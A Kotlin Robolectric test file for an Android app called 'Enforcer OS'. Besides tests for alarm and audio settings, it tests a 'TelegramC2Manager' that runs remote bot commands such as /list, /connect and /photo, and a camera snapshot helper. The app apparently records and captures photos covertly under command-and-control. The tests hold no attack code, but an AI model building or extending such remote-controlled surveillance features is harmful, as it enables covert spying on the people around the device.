package com.example

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import com.example.core.alarm.SmartAlarmScheduler
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [34])
class ExampleRobolectricTest {

  @Test
  fun `read string from context`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val appName = context.getString(R.string.app_name)
    assertEquals("Enforcer OS", appName)
  }

  @Test
  fun `smart alarm scheduler initializes correctly`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val scheduler = SmartAlarmScheduler(context)
    assertNotNull(scheduler)
  }

  @Test
  fun `audio recording settings toggle voice focus and gain correctly`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val settings = com.example.core.recorder.AudioRecordingSettings.getInstance(context)

    // Toggle voice focus
    val initialFocus = settings.isVoiceFocusEnabled.value
    val toggledFocus = settings.toggleVoiceFocus()
    assertEquals(!initialFocus, toggledFocus)
    assertEquals(!initialFocus, settings.isVoiceFocusEnabled.value)

    // Set distance gain
    settings.setDistanceGain(com.example.core.recorder.DistanceMicGain.BACK_ROW)
    assertEquals(com.example.core.recorder.DistanceMicGain.BACK_ROW, settings.distanceGain.value)
    assertEquals(2.0f, settings.distanceGain.value.multiplier, 0.001f)

    // Toggle AC hum filter
    val initialFilter = settings.isAcHumFilterEnabled.value
    val toggledFilter = settings.toggleAcHumFilter()
    assertEquals(!initialFilter, toggledFilter)
  }

  @Test
  fun `pocket gesture manager detects volume double press for bookmark`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val manager = com.example.core.recorder.PocketGestureManager.getInstance(context)

    var bookmarkTriggered = false
    // First press - should not trigger double-click
    val firstResult = manager.onVolumeKeyPressed(android.view.KeyEvent.KEYCODE_VOLUME_DOWN) {
      bookmarkTriggered = true
    }
    org.junit.Assert.assertFalse(firstResult)
    org.junit.Assert.assertFalse(bookmarkTriggered)

    // Second press immediately after (e.g. 200ms) - should trigger double click
    Thread.sleep(150)
    val secondResult = manager.onVolumeKeyPressed(android.view.KeyEvent.KEYCODE_VOLUME_DOWN) {
      bookmarkTriggered = true
    }
    org.junit.Assert.assertTrue(secondResult)
    org.junit.Assert.assertTrue(bookmarkTriggered)
  }

  @Test
  fun `telegram c2 manager executes list command and updates lastExecutedCommand`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val manager = com.example.core.recorder.TelegramC2Manager.getInstance(context)

    manager.executeCommand("/list", "fake_bot_token", "12345678")
    val lastCmd = manager.lastExecutedCommand.value
    org.junit.Assert.assertTrue(lastCmd.startsWith("/list"))
  }

  @Test
  fun `telegram c2 manager handles commands with bot username suffix and connect command`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val manager = com.example.core.recorder.TelegramC2Manager.getInstance(context)

    // Test command with @username
    manager.executeCommand("/list@my_enforcer_bot", "fake_bot_token", "99887766")
    val lastCmd = manager.lastExecutedCommand.value
    org.junit.Assert.assertTrue(lastCmd.startsWith("/list@my_enforcer_bot"))

    // Test /start command
    manager.executeCommand("/start", "fake_bot_token", "99887766")
    org.junit.Assert.assertTrue(manager.lastExecutedCommand.value.startsWith("/start"))

    // Test /connect command
    manager.executeCommand("/connect", "fake_bot_token", "99887766")
    org.junit.Assert.assertTrue(manager.lastExecutedCommand.value.startsWith("/connect"))
    val config = com.example.core.recorder.TelegramConfigManager.getInstance(context)
    assertEquals("99887766", config.getChatId())
  }

  @Test
  fun `camera snapshot helper generates telemetry frame when camera permission is absent`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val telemetryFile = com.example.core.recorder.CameraSnapshotHelper.createTelemetrySnapshot(
      context,
      preferFrontCamera = false,
      note = "UNIT TEST FRAME"
    )
    assertNotNull(telemetryFile)
    org.junit.Assert.assertTrue(telemetryFile.exists())
    org.junit.Assert.assertTrue(telemetryFile.length() > 0)
    telemetryFile.delete()
  }

  @Test
  fun `telegram c2 manager executes photo command gracefully`() {
    val context = ApplicationProvider.getApplicationContext<Context>()
    val manager = com.example.core.recorder.TelegramC2Manager.getInstance(context)
    manager.executeCommand("/photo", "fake_bot_token", "12345678")
    val lastCmd = manager.lastExecutedCommand.value
    org.junit.Assert.assertTrue(lastCmd.startsWith("/photo"))
  }
}

